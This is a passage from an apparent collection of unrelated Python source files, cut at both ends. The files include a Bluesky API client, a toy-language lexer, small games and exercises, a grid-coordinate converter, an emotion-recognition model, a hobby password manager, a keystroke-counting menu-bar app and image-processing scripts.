__getattr__(self, name):\n        if name in self._data:\n            return self._data[name]\n        raise AttributeError(name)\n\n\nclass Session:\n    def __init__(self, json, prefix):\n        self._data = json\n        self.prefix = prefix\n\n    def __getattr__(self, name):\n        if name in self._data:\n            return self._data[name]\n        raise AttributeError(name)\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, exc, value, traceback):\n        self.deleteSession()\n\n    def json(self):\n        \"\"\"return creteSession request response.\n        \"\"\"\n        return self._data\n\n    def get(self, path: str, params=None, token=\"accessJwt\") -> dict:\n        \"\"\" HTTP get with parameters and JWT header\n        path: url without prefix\n        params: HTTP get parameters dict\n        token: JWT header key name\n        \"\"\"\n        headers = {\"Authorization\": f\"Bearer {self._data[token]}\"}\n        return _requests_get(self.prefix + path, params, headers)\n\n    def post(self, path:str, data=None, token=\"accessJwt\") -> dict:\n        \"\"\" HTTP post with parameters and JWT header\n        path: url without prefix\n        params: HTTP post parameters dict or bytes\n        token: JWT header key name\n        \"\"\"\n        headers = {\n            \"Content-Type\": \"application/json; charset=UTF-8\",\n            \"Authorization\": f\"Bearer {self._data[token]}\",\n        }\n        if isinstance(data, dict):\n            data = json.dumps(data).encode('utf-8')\n        return _requests_post(self.prefix + path, data, headers)\n\n    def current_time(self) -> str:\n        \"\"\"get iso format current datetime\"\"\"\n        t = time.gmtime()\n        return f\"{t[0]:04}-{t[1]:02}-{t[2]:02}T{t[3]:02}:{t[4]:02}:{t[5]:02}.000Z\"\n\n    # See Bluesky HTTP API reference\n    # https://docs.bsky.app/docs/category/http-reference\n\n    def getPreferences(self) -> dict:\n        \"Get private preferences attached to the current account.\"\n        return self.get(\"app.bsky.actor.getPreferences\")\n\n    def getProfile(self, actor:str) -> dict:\n        \"Get detailed profile view of an actor.\"\n      ",
    "from enum import Enum\nfrom typing import Any\n\nclass TokenType(Enum):\n    # Special Tokens\n    EOF = \"EOF\"\n    ILLEGAL = \"ILLEGAL\"\n\n    # Data Types\n    IDENT = \"IDENT\"\n    INT = \"INT\"\n    FLOAT = \"FLOAT\"\n    STRING = \"STRING\"\n\n    # Arithmetic Symbols\n    PLUS = \"PLUS\"\n    MINUS = \"MINUS\"\n    ASTERISK = \"ASTERISK\"\n    SLASH = \"SLASH\"\n    POW = \"POW\"\n    MODULUS = \"MODULUS\"\n\n    # Assignment Symbols\n    EQ = \"EQ\"\n\n    # Comparison Symbols\n    LT = '<'\n    GT = '>'\n    EQ_EQ = '=='\n    NOT_EQ = '!='\n    LT_EQ = '<='\n    GT_EQ = '>='\n\n    # Symbols\n    COLON = \"COLON\"\n    COMMA = \"COMMA\"\n    SEMICOLON = \"SEMICOLON\"\n    ARROW = \"ARROW\"\n    LPAREN = \"LPAREN\"\n    RPAREN = \"RPAREN\"\n    LBRACE = \"LBRACE\"\n    RBRACE = \"RBRACE\"\n\n    # Keywords\n    LET = \"LET\"\n    FN = \"FN\"\n    RETURN = \"RETURN\"\n    IF = \"IF\"\n    ELSE = \"ELSE\"\n    TRUE = \"TRUE\"\n    FALSE = \"FALSE\"\n    WHILE = \"WHILE\"\n    BREAK = \"BREAK\"\n    CONTINUE = \"CONTINUE\"\n    FOR = \"FOR\"\n\n    # Typing\n    TYPE = \"TYPE\"\n\n\nclass Token:\n    def __init__(self, type: TokenType, literal: Any, line_no: int, position: int) -> None:\n        self.type = type\n        self.literal = literal\n        self.line_no = line_no\n        self.position = position\n\n    def __str__(self) -> str:\n        return f\"Token[{self.type} : {self.literal} : Line {self.line_no} : Position {self.position}]\"\n    \n    def __repr__(self) -> str:\n        return str(self)\n    \n\nKEYWORDS: dict[str, TokenType] = {\n    \"let\": TokenType.LET,\n    \"fn\": TokenType.FN,\n    \"return\": TokenType.RETURN,\n    \"if\": TokenType.IF,\n    \"else\": TokenType.ELSE,\n    \"true\": TokenType.TRUE,\n    \"false\": TokenType.FALSE,\n    \"while\": TokenType.WHILE,\n    \"break\": TokenType.BREAK,\n    \"continue\": TokenType.CONTINUE,\n    \"for\": TokenType.FOR,\n}\n\nALT_KEYWORDS: dict[str, TokenType] = {\n    \"lit\": TokenType.LET,\n    \"be\": TokenType.EQ,\n    \"rn\": TokenType.SEMICOLON,\n    \"bruh\": TokenType.FN,\n    \"pause\": TokenType.RETURN,\n    \"3--D\": TokenType.ARROW,\n    \"sus\": TokenType.IF,\n    \"imposter\": TokenType.ELSE,\n    \"wee\": TokenType.WHILE,\n    \"yeet\": TokenType.BREAK,\n    \"anothaone\": TokenType.CONTINUE,\n    \"dab\": TokenType.FOR,\n}\n\nTYPE_KEYWORDS: list[str] = [\"int\", \"float\", \"str\", \"void\"]\n\ndef lookup_ident(ident: str) -> TokenType:\n    tt: TokenType | None = KEYWORDS.get(ident)\n    if tt is not None:\n        return tt\n    \n    tt: TokenType | None = ALT_KEYWORDS.get(ident)\n    if tt is not None:\n        return tt\n    \n    if ident in TYPE_KEYWORDS:\n        return TokenType.TYPE\n    \n    return TokenType.IDENT\n",
    "def print_board(board):\n    \"\"\"Print the current Tic Tac Toe board.\"\"\"\n    for row in board:\n        print(\" | \".join(row))\n        print(\"-\" * 9)\n\ndef check_winner(board, symbol):\n    \"\"\"Check if the given symbol has won.\"\"\"\n    # Check rows and columns\n    for i in range(3):\n        if board[i][0] == board[i][1] == board[i][2] == symbol:  # Row check\n            return True\n        if board[0][i] == board[1][i] == board[2][i] == symbol:  # Column check\n            return True\n    # Check diagonals\n    if board[0][0] == board[1][1] == board[2][2] == symbol:  # Main diagonal\n        return True\n    if board[0][2] == board[1][1] == board[2][0] == symbol:  # Anti-diagonal\n        return True\n    return False\n\ndef tic_tac_toe():\n    \"\"\"Main function to play Tic Tac Toe.\"\"\"\n    # Create a 3x3 board\n    board = [[\"1\", \"2\", \"3\"], [\"4\", \"5\", \"6\"], [\"7\", \"8\", \"9\"]]\n    print(\"Welcome to Tic Tac Toe!\")\n    print_board(board)\n    \n    # Players and symbols\n    player1 = input(\"Enter Player 1's name: \")\n    player2 = input(\"Enter Player 2's name: \")\n    symbols = {player1: \"X\", player2: \"O\"}\n    \n    # Game loop\n    moves = 0\n    while moves < 9:\n        current_player = player1 if moves % 2 == 0 else player2\n        symbol = symbols[current_player]\n        \n        try:\n            choice = int(input(f\"{current_player}, enter the number where you want to place '{symbol}': \"))\n            if choice < 1 or choice > 9:\n                print(\"Invalid choice! Please select a number between 1 and 9.\")\n                continue\n            \n            # Convert choice to board coordinates\n            row, col = (choice - 1) // 3, (choice - 1) % 3\n            \n            if board[row][col] in [\"X\", \"O\"]:\n                print(\"This spot is already taken! Choose another.\")\n                continue\n            \n            # Update board\n            board[row][col] = symbol\n            print_board(board)\n            moves += 1\n            \n            # Check for winner\n            if check_winner(board, symbol):\n                print(f\"Congratulations, {current_player}! You win!\")\n                return\n        \n        except ValueError:\n            print(\"Invalid input! Please enter a valid number.\")\n    \n    print(\"It's a tie! No one wins.\")\n\n# Run the game\ntic_tac_toe()\n",
    "#!/usr/bin/env uv run\n# /// script\n# requires-python = \">=3.1\"\n# dependencies = [\n#     \"pyproj\",\n#     \"pandas\",\n#     \"openpyxl\",\n# ]\n# ///\n# Then just: uv run main.py input.xlsx output.xlsx\n\n# Or traditional installs:\n# pip install pyproj\n# pip install pandas\n# pip install openpyxl\n# python main.py input.xlsx output.xlsx\n\n# #!/usr/bin/env python3\n\nimport sys\nimport pandas as pd\nfrom pyproj import Transformer\n\ndef irish_grid_to_latlon(easting, northing, transformer):\n    \"\"\"\n    Convert traditional Irish Grid (EPSG:29900) to WGS84 lat/lon (EPSG:4326).\n    Returns (latitude, longitude).\n    \"\"\"\n    # pyproj returns (lon, lat) when converting to EPSG:4326, so swap\n    lon, lat = transformer.transform(easting, northing)\n    return lat, lon\n\ndef main():\n    \"\"\"\n    Usage:\n        python irish_grid_xlsx_converter.py <input.xlsx> <output.xlsx>\n    \n    Requirements:\n      - 'Easting' and 'Northing' columns exist in the spreadsheet.\n      - Rows with non-numeric Easting/Northing will keep their original text \n        and have blank ('') Latitude/Longitude.\n    \"\"\"\n    if len(sys.argv) != 3:\n        print(f\"Usage: {sys.argv[0]} <input.xlsx> <output.xlsx>\")\n        sys.exit(1)\n\n    input_xlsx = sys.argv[1]\n    output_xlsx = sys.argv[2]\n\n    # 1. Create the transformer (Irish Grid -> WGS84)\n    #    Change \"EPSG:29900\" to \"EPSG:29902\" if needed.\n    transformer = Transformer.from_crs(\"EPSG:29900\", \"EPSG:4326\", always_xy=True)\n\n    # 2. Read the Excel file\n    df = pd.read_excel(input_xlsx)\n\n    # Optional: Debug prints to confirm columns and types\n    print(\"Columns in spreadsheet:\", df.columns.tolist())\n    print(\"Data types:\\n\", df.dtypes)\n    print(df.head())\n\n    # 3. Check for 'Easting' and 'Northing' columns\n    if \"Easting\" not in df.columns or \"Northing\" not in df.columns:\n        raise ValueError(\"Missing 'Easting' or 'Northing' columns in the Excel file.\")\n\n    # 4. Create or initialize Latitude and Longitude columns as blank\n    #    This preserves rows that don't have valid numeric data.\n    df[\"Latitude\"] = \"\"\n    df[\"Longitude\"] = \"\"\n\n    # 5. Iterate row-by-row to convert valid numeric Easting/Northing\n    for idx, row in df.iterrows():\n        # Convert the *original* Easting/Northing text to numeric; NaN if invalid\n        easting_num = pd.to_numeric(row[\"Easting\"], errors=\"coerce\")\n        northing_num = pd.to_numeric(row[\"Northing\"], errors=\"coerce\")\n\n        # If both easting and northing are valid numbers, compute lat/lon\n        if pd.notna(easting_num) and pd.notna(northing_num):\n            lat, lon = irish_grid_to_latlon(easting_num, northing_num, transformer)\n            df.at[idx, \"Latitude\"] = lat\n            df.at[idx, \"Longitude\"] = lon\n        else:\n            # Leave Latitude and Longitude blank in non-numeric cases\n            df.at[idx, \"Latitude\"] = \"\"\n            df.at[idx, \"Longitude\"] = \"\"\n\n    # 6. Write out the updated DataFrame\n    df.to_excel(output_xlsx, index=False)\n    print(f\"Converted file saved as: {output_xlsx}\")\n\nif __name__ == \"__main__\":\n    main()",
    "\r\n#Dictionary\r\nMenu = {\r\n    \"espresso\": {\r\n        \"ingredients\": {\r\n            \"water\": 50,\r\n            \"coffee\": 18,\r\n        },\r\n        \"cost\": 1.5,\r\n    },\r\n    \"latte\": {\r\n        \"ingredients\": {\r\n            \"water\": 200,\r\n            \"milk\": 150,\r\n            \"coffee\": 24,\r\n        },\r\n        \"cost\": 2.5\r\n    },\r\n    \"cappuccino\": {\r\n        \"ingredients\": {\r\n            \"water\": 250,\r\n            \"milk\": 100,\r\n            \"coffee\": 24,\r\n        },\r\n        \"cost\": 3.0,\r\n    },\r\n\r\n}\r\n\r\n\r\nprofit = 0\r\nresources = {\r\n    \"water\": 300,\r\n    \"milk\": 200,\r\n    \"coffee\": 100\r\n}\r\n\r\ndef is_resources_sufficient(order_ingredients):\r\n    \"\"\"Returns True when the Order can be made , False if ingredients are insufficient  .\"\"\"\r\n    for item in order_ingredients:\r\n        if order_ingredients[item] >= resources[item]:\r\n            print(f\"Sorry there is not enough .{item}.\")\r\n            return False\r\n    return True\r\n\r\n\r\ndef process_coins():\r\n    \"\"\"Returns The Total Calculated from coins Inserted .\"\"\"\r\n    print(\"Please Insert coins.\")\r\n    total = int(input(\"How many Quarters? \")) * 0.25\r\n    total += int(input(\"How many Dimes? \")) * 0.1\r\n    total += int(input(\"How many Nickles? \")) * 0.05\r\n    total += int(input(\"How many Pennies? \")) * 0.01\r\n    return total\r\n\r\n\r\n\r\ndef is_transaction_successful(money_received , drink_cost):\r\n    \"\"\"Return True when the payment is accepted, or False if money is insufficient . \"\"\"\r\n    if money_received >= drink_cost:\r\n        change = round(money_received - drink_cost, 2)\r\n        print(f\"Here is ${change} in Change.\")\r\n        global profit\r\n        profit += drink_cost\r\n        return True\r\n    else:\r\n        print(\"Sorry that's not enough money. money refunded\")\r\n        return False\r\n\r\n\r\ndef make_coffee(drink_name, order_ingredients):\r\n    \"\"\"Deduct the required ingredients from the resources \"\"\"\r\n    for item in order_ingredients:\r\n        resources[item] -=order_ingredients[item]\r\n    print(f\"Here is your {drink_name} \u2615\u2615\u2615\")\r\n\r\n\r\nis_on = True\r\nwhile is_on:\r\n    choice = input(\"What would you like ? (espresso/Latte/Cappuccino): \")\r\n    if choice == \"off\":\r\n        is_on = False\r\n    elif choice == \"report\":\r\n        print(f\"Water: {resources['milk']}ml\")\r\n        print(f\"Coffee: {resources['coffee']}g\")\r\n        print(f\"Money: {profit}$\")\r\n    else:\r\n        drink = Menu[choice]\r\n        if is_resources_sufficient(drink[\"ingredients\"]):\r\n            payment = process_coins()\r\n            if is_transaction_successful(payment, drink[\"cost\"]):\r\n                make_coffee(choice, drink[\"ingredients\"])\r\n\r\n\r\n\r\n\r\n\r\n",
    "import numpy as np\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom torch.nn.utils.rnn import pad_sequence\nfrom sentence_transformers import SentenceTransformer\nfrom transformers import BertTokenizer, RobertaTokenizer, XLNetTokenizer\nfrom transformers import BertForSequenceClassification, RobertaForSequenceClassification, XLNetModel\nimport math\nimport copy\n\nimport sys\n\nif torch.cuda.is_available():\n    FloatTensor = torch.cuda.FloatTensor\n    LongTensor = torch.cuda.LongTensor\n    ByteTensor = torch.cuda.ByteTensor\n\nelse:\n    FloatTensor = torch.FloatTensor\n    LongTensor = torch.LongTensor\n    ByteTensor = torch.ByteTensor\n\nclass MaskedNLLLoss(nn.Module):\n    def __init__(self, weight=None):\n        super(MaskedNLLLoss, self).__init__()\n        self.weight = weight\n        self.loss = nn.NLLLoss(weight=weight, reduction='sum')      ## nn.NLLLoss\n        '''\n        nn.NLLLoss\n        \u5b98\u65b9\u6587\u6863\u4e2d\u4ecb\u7ecd\u79f0\uff1a nn.NLLLoss\u8f93\u5165\u662f\u4e00\u4e2a\u5bf9\u6570\u6982\u7387\u5411\u91cf\u548c\u4e00\u4e2a\u76ee\u6807\u6807\u7b7e\uff0c\u5b83\u4e0enn.CrossEntropyLoss\u7684\u5173\u7cfb\u53ef\u4ee5\u63cf\u8ff0\u4e3a\uff1asoftmax(x)+log(x)+nn.NLLLoss====>nn.CrossEntropyLoss\n        '''\n\n    def forward(self, pred, target, mask):\n        '''\n        param pred: (batch_size, num_utterances, n_classes)\n        param target: (batch_size, num_utterances)\n        param mask: (batch_size, num_utterances)\n        '''\n        mask_ = mask.view(-1,1) \n        if type(self.weight)==type(None):\n            loss = self.loss(pred*mask_, target)/torch.sum(mask)\n        else:\n            loss = self.loss(pred*mask_, target)/torch.sum(self.weight[target]*mask_.squeeze())\n        return loss\n\n# \u8be5\u90e8\u5206\u4ee3\u7801\u53c2\u8003github\u9879\u76ee https://github.com/declare-lab/conv-emotion\nclass EncoderModel(nn.Module):\n    def __init__(self, D_h, cls_model, transformer_model_family, mode, attention=False, residual=False):\n        '''\n        param transformer_model_family: bert or roberta or xlnet\n        param mode: 0(base) or 1(large)\n        '''\n        super().__init__()\n        \n        if transformer_model_family == 'bert':\n            if mode == '0':\n                model = BertForSequenceClassification.from_pretrained('bert-base-uncased')\n                tokenizer = BertTokenizer.from_pretrained('bert-base-uncased')\n                hidden_dim = 768\n            elif mode == '1':\n                model = BertForSequenceClassification.from_pretrained('bert-large-uncased')\n                tokenizer = BertTokenizer.from_pretrained('bert-large-uncased')\n                hidden_dim = 1024       \n        elif transformer_model_family == 'roberta':\n            if mode == '0':\n                model = RobertaForSequenceClassification.from_pretrained('roberta-base')\n                tokenizer = RobertaTokenizer.from_pretrained('roberta-base')\n                hidden_dim = 768\n            elif mode == '1':\n                model = RobertaForSequenceClassification.from_pretrained('roberta-large')\n                tokenizer = BertTokenizer.from_pretrained('roberta-large')\n                hidden_dim = 1024      \n        elif transformer_model_family == 'xlnet':\n            if mode == '0':\n                model = XLNetModel.from_pretrained('xlnet-base-cased')\n                tokenizer = XLNetTokenizer.from_pretrained('xlnet-base-cased')\n                hidden_dim = 768\n                \n        self.transformer_model_family = transformer_model_family\n        self.model = model.cuda()\n        self.hidden_dim = hidden_dim\n        self.cls_model = cls_model\n        self.D_h = D_h\n        self.residual = residual\n        if transformer_model_family == 'xlnet':\n            if mode == '0':\n                self.model.mem_len = 900\n                self.model.attn_type = 'bi'\n        \n        if self.transformer_model_family in ['bert', 'roberta', 'xlnet']:\n            self.tokenizer = tokenizer\n        \n    def pad(self, tensor, length):\n        if length > tensor.size(0):\n            return torch.cat([tensor, torch.zeros(length - tensor.size(0), *tensor.size()[1:]).cuda()])\n        else:\n            return tensor\n  \n    def forward(self, conversations, lengths, umask, qmask):\n        '''\n        param conversations: \u5305\u542b\u8bed\u53e5\u5e8f\u5217\u7684\u5bf9\u8bdd\uff0clist\n        param lengths: \u6bcf\u4e2a\u5bf9\u8bdd\u7684\u957f\u5ea6\uff0clist\n        \u8fd4\u56de\u503c\uff1a\u7ecf\u8fc7bert\u7f16\u7801\u540e\u7684\u8bed\u4e49\u5411\u91cf\uff0c\u53ca\u63a9\u7801mask\n        '''\n        # \u63d0\u53d6\u591a\u4e2a\u5bf9\u8bdd\u4e2d\u7684\u6240\u6709\u53e5\u5b50\n        lengths = torch.Tensor(lengths).long()\n        start = torch.cumsum(torch.cat((lengths.data.new(1).zero_(), lengths[:-1])), 0)\n        utterances = [sent for conv in conversations for sent in conv]\n        \n        if self.transformer_model_family in ['bert', 'roberta']:\n            # \u5206\u8bcd\n            batch = self.tokenizer(utterances, padding=True, return_tensors=\"pt\") \n            input_ids = batch['input_ids'].cuda()\n            attention_mask = batch['attention_mask'].cuda()\n            # \u8f93\u5165bert\uff0c\u8fd4\u56de[CLS]\u4f4d\u7684\u5411\u91cf\u4f5c\u4e3a\u8bed\u4e49\u5411\u91cf\n            _, features = self.model(input_ids, attention_mask, output_hidden_states=True) \n            if self.transformer_model_family == 'roberta':\n                features = features[:, 0, :]\n                \n        elif self.transformer_model_family == 'xlnet':\n            b",
    "# Author - Mmabiaa\r\n# password_manager.py\r\n\r\nimport json\r\nimport hashlib\r\nimport getpass\r\nimport sys\r\nfrom cryptography.fernet import Fernet\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\nimport base64\r\nimport os\r\nimport secrets\r\nimport string\nfrom green import print_green\r\n\r\n\r\ndef hash_password(password):\r\n    \"\"\"Hash the password using SHA256.\"\"\"\r\n    return hashlib.sha256(password.encode()).hexdigest()\r\n\r\n\r\ndef register():\r\n    \"\"\"Register a new user.\"\"\"\r\n    username = input('Enter your username: ')\r\n    master_password = getpass.getpass('/,Enter your master password: ')\r\n    master_password_hash = hash_password(master_password)\r\n\r\n    with open('user_data.json', 'w') as file:\r\n        json.dump({'username': username, 'master_password': master_password_hash}, file)\r\n        print_green('\\n[+] Registration Completed!!\\n')\r\n\r\n\r\ndef login(username, entered_password):\r\n    \r\n    \"\"\"Login to the password manager.\"\"\"\r\n    try:\r\n        \r\n        with open('user_data.json', 'r') as file:\r\n            user_data = json.load(file)\r\n            stored_password = user_data.get('master_password')\r\n            entered_password_hash = hash_password(entered_password)\r\n\r\n            if entered_password_hash == stored_password and username == user_data.get('username'):\r\n                print_green('\\n[+] Login Successful...\\n')\r\n                return True\r\n                \r\n            else:\r\n                print_green('\\n[+] Invalid Login Credentials... Login Failed!!\\n')\r\n                print_green('\\n[+] Use the registered credentials to login')\r\n                sys.exit()\r\n                \r\n    except Exception:\r\n        print_green('\\n[+] You must register to begin...!!!\\n')\r\n        sys.exit()\r\n\r\ndef generate_key(master_password):\r\n    \"\"\"Generate a key using PBKDF2HMAC.\"\"\"\r\n    kdf = PBKDF2HMAC(\r\n        algorithm=hashes.SHA256(),\r\n        length=32,\r\n        salt=b'salt',\r\n        iterations=100000,\r\n    )\r\n    key = base64.urlsafe_b64encode(kdf.derive(master_password.encode()))\r\n    return key\r\n\r\ndef encrypt_password(password, key):\r\n    \"\"\"Encrypt the password using Fernet.\"\"\"\r\n    f = Fernet(key)\r\n    return f.encrypt(password.encode())\r\n\r\ndef decrypt_password(encrypted_password, key):\r\n    \"\"\"Decrypt the password using Fernet.\"\"\"\r\n    f = Fernet(key)\r\n    return f.decrypt(encrypted_password).decode()\r\n\r\ndef generate_password(length=12):\r\n    \"\"\"Generate a random password.\"\"\"\r\n    characters = string.ascii_letters + string.digits + string.punctuation\r\n    password = ''.join(secrets.choice(characters) for _ in range(length))\r\n    return password\r\n\r\ndef save_password(website, username, password, key):\r\n    \"\"\"Save a password for a website.\"\"\"\r\n    encrypted_password = encrypt_password(password, key)\r\n    \r\n    try:\r\n        with open('password.json', 'r') as file:\r\n            passwords = json.load(file)\r\n            \r\n    except FileNotFoundError:\r\n        passwords = {}\r\n    \r\n    passwords[website] = {\r\n        'username': username,\r\n        'password': encrypted_password.decode()\r\n    }\r\n\r\n    with open('password.json', 'w') as file:\r\n        json.dump(passwords, file)\r\n        print_green(f'\\n[+] Password saved for {website}...\\n')\r\n\r\ndef view_saved_websites(key):\r\n    \"\"\"View saved websites and their passwords.\"\"\"\r\n    try:\r\n        with open('password.json', 'r') as file:\r\n            passwords = json.load(file)\r\n            print_green(\"Websites you saved...\")\r\n            for website, data in passwords.items():\r\n                encrypted_password = data['password'].encode()\r\n                decrypted_password = decrypt_password(encrypted_password, key)\r\n                print_green(f\"Website: {website}\")\r\n                print_green(f\"Username: {data['username']}\")\r\n                print_green(f\"Password: {decrypted_password}\\n\")\r\n    except FileNotFoundError:\r\n        print_green('\\n[+] No passwords saved yet...\\n')\r\n\r\n",
    "#!/usr/bin/env python3\nimport rumps\nimport sqlite3\nfrom pathlib import Path\nfrom pynput import keyboard\nfrom queue import Queue\n\n# from dotenv import load_dotenv\n\nAPP_NAME = \"qiimetrics\"\nBASE_DIR = Path(__file__).resolve().parent\nHOME_DIR = Path.home()\nCONFIG_DIR = HOME_DIR / \".config\" / APP_NAME\nCONFIG_DIR.mkdir(parents=True, exist_ok=True)\n\nDB_PATH = CONFIG_DIR / \"db.sqlite3\"\n# load_dotenv(CONFIG_DIR / \".env\")\nprint(f\"{APP_NAME} is starting..\")\n\n\ndef init_db():\n    conn = sqlite3.connect(DB_PATH)\n    c = conn.cursor()\n    c.execute(\n        \"\"\"\n        CREATE TABLE IF NOT EXISTS keystrokes (\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\n            timestamp REAL DEFAULT (strftime('%s', 'now')),\n            counter INTEGER DEFAULT 0\n        )\n    \"\"\"\n    )\n    conn.commit()\n    conn.close()\n\n\ndef write_to_db(counter):\n    conn = sqlite3.connect(DB_PATH)\n    c = conn.cursor()\n    c.execute(\"INSERT INTO keystrokes (counter) VALUES (?)\", (counter,))\n    conn.commit()\n    conn.close()\n\n\ndef get_last_value_from_db():\n    conn = sqlite3.connect(DB_PATH)\n    c = conn.cursor()\n    c.execute(\"SELECT counter FROM keystrokes ORDER BY id DESC LIMIT 1\")\n    result = c.fetchone()\n    conn.close()\n    return result[0] if result else 0\n\n\nclass KeyboardMonitor:\n    def __init__(self, queue):\n        self.queue = queue\n        self._running = True\n        self.listener = keyboard.Listener(on_press=self._on_press)\n\n    def _on_press(self, key):\n        if self._running:\n            key_char = key.char if hasattr(key, \"char\") else str(key)\n            self.queue.put(key_char)\n\n    def start(self):\n        self.listener.start()\n\n    def stop(self):\n        self._running = False\n        self.listener.stop()\n\n\nclass StatusBarApp(rumps.App):\n    def __init__(self, queue):\n        super().__init__(\"\ud83d\udc68\u200d\ud83d\udcbb\")\n        self.queue = queue\n        self._running = True\n        self.counter = get_last_value_from_db()\n        self.title = f\"\ud83d\udc68\u200d\ud83d\udcbb {self.counter}\"\n        self.menu = [\"Reset\"]\n\n    @rumps.clicked(\"Reset\")\n    def reset_counter(self, _):\n        self.counter = 0\n        self.title = f\"\ud83d\udc68\u200d\ud83d\udcbb {self.counter}\"\n        write_to_db(self.counter)\n\n    def check_queue(self, sender):\n        while not self.queue.empty():\n            key = self.queue.get()\n            self.counter += 1\n\n            if self.queue.empty():\n                self.title = f\"\ud83d\udc68\u200d\ud83d\udcbb {self.counter}\"\n                write_to_db(self.counter)\n\n\ndef main():\n    event_queue = Queue()\n\n    # Initialize keyboard monitor\n    keyboard_monitor = KeyboardMonitor(event_queue)\n    keyboard_monitor.start()\n\n    # Initialize status bar app\n    app = StatusBarApp(event_queue)\n\n    # Set up timer for queue checking\n    timer = rumps.Timer(app.check_queue, 3)\n    timer.start()\n\n    # Run the status bar app\n    app.run()\n\n    # Cleanup on exit\n    keyboard_monitor.stop()\n\n\nif __name__ == \"__main__\":\n    init_db()\n    main()\n",
    "import cv2\nfrom io import StringIO\n\ntemp = '''\nUSE32\n\nglobal art\n\nsection .data\nwide: dd 0, 0, 0\n\nsection .text\n\ntable:\n%s\n\nart:\nmov eax, 0\njmp [table+eax*4]\n\n%s\n\nend:\nret\n'''\n\nlabels = StringIO()\ncodes = StringIO()\n\n# \u52a0\u8f7d\u56fe\u50cf\nimage = cv2.imread('image.jpg')\n\nwidth = 256\nheight = 256\n\n# \u8c03\u6574\u56fe\u7247\u5927\u5c0f\nresize = cv2.resize(image, (width, height), interpolation = cv2.INTER_CUBIC)\n\n# \u4e8c\u503c\u5316\ngray = cv2.cvtColor(resize, cv2.COLOR_BGR2GRAY)\nretval, gray_image = cv2.threshold(gray, 0, 255,  cv2.THRESH_BINARY | cv2.THRESH_OTSU)\n\n# \u62fc\u63a5\u4ee3\u7801\nfor y in range(height + 1):\n    for x in range(width + 1):\n        label = \"pixel_%d_%d\" % (x, y)\n\n        if x == 0:\n            if y == height:\n                codes.write(\"%s:\\nvfmaddsub132ps xmm0,xmm1,[cs:edi+esi*4+wide+4]\\njmp end\\n\" % label)\n            else:\n                codes.write(\"%s:\\nvfmaddsub132ps xmm0,xmm1,[cs:edi+esi*4+wide+4]\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\njmp pixel_%d_%d\\n\" % (label, x, y + 1))\n            continue\n        \n        if y == 0:\n            labels.write(\"dd %s\\n\" % label)\n\n        if y == height:\n            codes.write(\"%s:\\nvfmaddsub132ps xmm0,xmm1,[cs:edi+esi*4+wide+4]\\njmp end\\n\" % label)\n            continue\n\n        value = gray_image[y, x - 1]\n        if value == 255:\n            codes.write(\"%s:\\nvfmaddsub132ps xmm0,xmm1,[cs:edi+esi*4+wide+4]\\njmp pixel_%d_%d\\n\" % (label, x, y + 1))\n        else:\n            codes.write(\"%s:\\nvfmaddsub132ps xmm0,xmm1,[cs:edi+esi*4+wide+4]\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\nnop\\njmp pixel_%d_%d\\n\" % (label, x, y + 1))\n\nopen(\"output.asm\", \"w\").write(temp % (labels.getvalue(), codes.getvalue()))\n\n# nasm -f win32 .\\output.asm\n\n# \u663e\u793a\u56fe\u50cf\ncv2.imshow('Black and White Image', gray_image)\ncv2.waitKey(0)\ncv2.destroyAllWindows()\n",
    "import cv2, os, shutil, pyautogui, glob, time\nfrom PIL import Image, ImageGrab\nimport pyperclip as pc\nimport numpy as np\n\n# \u753b\u50cf\u767d\u9ed2\u5909\u63db\u6642\u306e\u95be\u5024\u3092\u8a2d\u5b9a\nThreshold      = 220\n\n# https://ja.stackoverflow.com/questions/31588/opencv-%E3%81%A7%E7%94%BB%E5%83%8F%E3%82%92%E7%AD%89%E5%88%86%E3%81%97%E3%81%9F%E3%81%84\ndef Picture_Split(Picture_Name, X_Num, Y_Num):\n    #\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u30a4\u30f3\u30dd\u30fc\u30c8\n    #import cv2\n\n    img = cv2.imread(Picture_Name + \".png\")\n    height, width, channels = img.shape\n\n    width_split = X_Num\n    height_split = Y_Num\n    new_img_height = int(height / height_split)\n    new_img_width = int(width / width_split)\n\n    for h in range(height_split):\n        height_start = h * new_img_height\n        height_end = height_start + new_img_height\n\n        for w in range(width_split):\n            width_start = w * new_img_width\n            width_end = width_start + new_img_width\n\n            file_name = Picture_Name+ \"_\" + str(h) + str(w) + \".png\"\n            clp = img[height_start:height_end, width_start:width_end]\n            cv2.imwrite(file_name, clp)\n\n\n# generateimage array\n# https://python.joho.info/opencv/opencv-svm-digits-python/\ndef create_images_array(load_img_paths):\n    #import glob\n    #import cv2\n    #import numpy as np\n\n    imgs = []\n    # \u753b\u50cf\u7fa4\u306e\u914d\u5217\u3092\u751f\u6210\n    for load_img_path in load_img_paths:\n        # \u753b\u50cf\u3092\u30ed\u30fc\u30c9, \u30b0\u30ec\u30fc\u30b9\u30b1\u30fc\u30eb\u5909\u63db\n        # \u8272\u53cd\u8ee2, 32*32\u306b\u30ea\u30b5\u30a4\u30ba, 1\u6b21\u5143\u914d\u5217\u306b\u5909\u63db\n        img = cv2.imread(load_img_path)\n        #img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n        #img = cv2.bitwise_not(img)\n        img = cv2.resize(img, (32, 32))\n        img = img.flatten()\n        imgs.append(img)\n    return np.array(imgs, np.float32)\n\n# support vector machine\n# https://python.joho.info/opencv/opencv-svm-digits-python/\ndef SVM():\n    # \u5b66\u7fd2\u7528\u306e\u753b\u50cf\u30d5\u30a1\u30a4\u30eb\u306e\u683c\u7d0d\u5148\uff080\uff5e9\uff09\n    LOAD_TRAIN_IMG0S_PATH = './Model/0/*'\n    LOAD_TRAIN_IMG1S_PATH = './Model/1/*'\n    LOAD_TRAIN_IMG2S_PATH = './Model/2/*'\n    LOAD_TRAIN_IMG3S_PATH = './Model/3/*'\n    LOAD_TRAIN_IMG4S_PATH = 